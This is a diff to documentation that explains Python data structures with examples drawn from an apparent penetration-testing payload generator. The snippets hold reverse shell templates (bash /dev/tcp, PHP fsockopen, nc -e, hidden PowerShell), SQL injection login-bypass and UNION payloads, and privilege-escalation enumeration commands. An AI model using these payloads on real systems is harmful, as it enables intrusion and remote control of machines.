@@ -302,64 +302,133 @@ Here are examples from this codebase demonstrating these patterns:
 
 ### Domain Classes (from `src/models.py`)
 
+The codebase uses Pydantic models with validation, demonstrating classes as domain designs:
+
 ```python
-from pydantic import BaseModel, Field
+from pydantic import BaseModel, Field, field_validator, ConfigDict
 from enum import Enum
 
 class ShellType(str, Enum):
-    """Reverse shell types."""
+    """Reverse shell types - an Enum class defining allowed values."""
     BASH = "bash"
     PYTHON = "python"
     PHP = "php"
+    POWERSHELL = "powershell"
 
 class ReverseShellInput(BaseModel):
-    """Input model for reverse shell generation - a domain design."""
-    shell_type: ShellType
-    lhost: str
-    lport: int
+    """Input model for reverse shell generation - a domain design with validation."""
+    model_config = ConfigDict(
+        str_strip_whitespace=True,
+        validate_assignment=True,
+        extra='forbid'
+    )
+
+    shell_type: ShellType = Field(
+        ...,
+        description="Type of reverse shell to generate"
+    )
+    lhost: str = Field(
+        ...,
+        description="Attacker's IP address",
+        min_length=7,
+        max_length=45
+    )
+    lport: int = Field(
+        ...,
+        description="Listening port on attacker machine",
+        ge=1,
+        le=65535
+    )
+    encode: bool = Field(
+        default=False,
+        description="Base64 encode the payload"
+    )
+```
+
+### List as Collection for Iteration (from `src/payloads.py`)
+
+Lists hold items that will be processed uniformly - here, SQL injection payloads:
+
+```python
+def generate_sqli_payloads(
+    self,
+    injection_type: str,
+    columns: Optional[int] = None,
+    database: str = "mysql"
+) -> str:
+    payloads = []  # list will hold payloads for this injection type
+
+    if injection_type == "auth_bypass":
+        payloads = [
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' /*",
+            "admin' --",
+            "admin' #",
+            "' OR 1=1--",
+            "') OR ('1'='1",
+        ]
+    elif injection_type == "union_based":
+        cols = columns or 3
+        payloads = [
+            f"' UNION SELECT {','.join(['NULL']*cols)}--",
+            f"' UNION SELECT {','.join([str(i) for i in range(1, cols+1)])}--",
+        ]
+    
+    # List is iterated to build output
+    for i, payload in enumerate(payloads, 1):
+        output += f"{i}. `{payload}`\n"
+```
+
+### Dict as Lookup Registry (from `src/payloads.py`)
+
+Dicts provide fast key-based access - here, shell type → payload template:
+
+```python
+def generate_reverse_shell(
+    self,
+    shell_type: str,
+    lhost: str,
+    lport: int,
     encode: bool = False
-```
-
-### List as Internal Queue (from `src/payloads.py`)
-
-```python
-class PayloadGenerator:
-    def generate_sqli_payloads(self, injection_type: str, ...) -> str:
-        payloads = []  # list as work collection
-        
-        if injection_type == "auth_bypass":
-            payloads = [
-                "' OR '1'='1",
-                "' OR '1'='1' --",
-                # ... more payloads
-            ]
-        # payloads list used to iterate and format output
-```
-
-### Dict as Registry (from `src/payloads.py`)
-
-```python
-def generate_reverse_shell(self, shell_type: str, lhost: str, lport: int, ...) -> str:
-    payloads = {  # dict as lookup registry
+) -> str:
+    # Dict as registry mapping shell types to payload templates
+    payloads = {
         "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
-        "python": f"python -c 'import socket...'",
-        "powershell": f"powershell -NoP ...",
+        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(...)'",
+        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh...\");'",
+        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...",
+        "netcat": f"nc -e /bin/sh {lhost} {lport}",
     }
+    
+    # Fast lookup by key with fallback
     payload = payloads.get(shell_type, payloads["bash"])
 ```
 
-### Tuple as Grouped Return (from `src/payloads.py`)
+### Tuple as Grouped Values (from `src/payloads.py`)
+
+Tuples group related values that belong together - here, (title, command) pairs:
 
 ```python
 def generate_privesc_enum(self, target_os: str, check_type: str) -> str:
-    commands = []  # list of tuples!
+    commands = []  # list of tuples: each tuple is (title, command)
     
-    if check_type in ["all", "quick"]:
-        commands.extend([
-            ("System Info", "uname -a; cat /etc/*-release"),  # tuple: (title, cmd)
-            ("Current User", "id; whoami"),
-            ("Sudo Rights", "sudo -l"),
-        ])
+    if target_os == "linux":
+        if check_type in ["all", "quick"]:
+            commands.extend([
+                ("System Info", "uname -a; cat /etc/*-release"),
+                ("Current User", "id; whoami"),
+                ("Sudo Rights", "sudo -l"),
+            ])
+        if check_type in ["all", "suid"]:
+            commands.extend([
+                ("SUID Binaries", "find / -perm -4000 -type f 2>/dev/null"),
+                ("SGID Binaries", "find / -perm -2000 -type f 2>/dev/null"),
+            ])
+    
+    # Tuples unpacked during iteration
+    for title, cmd in commands:
+        output += f"### {title}\n```bash\n{cmd}\n```\n\n"
 ```
 
 ---
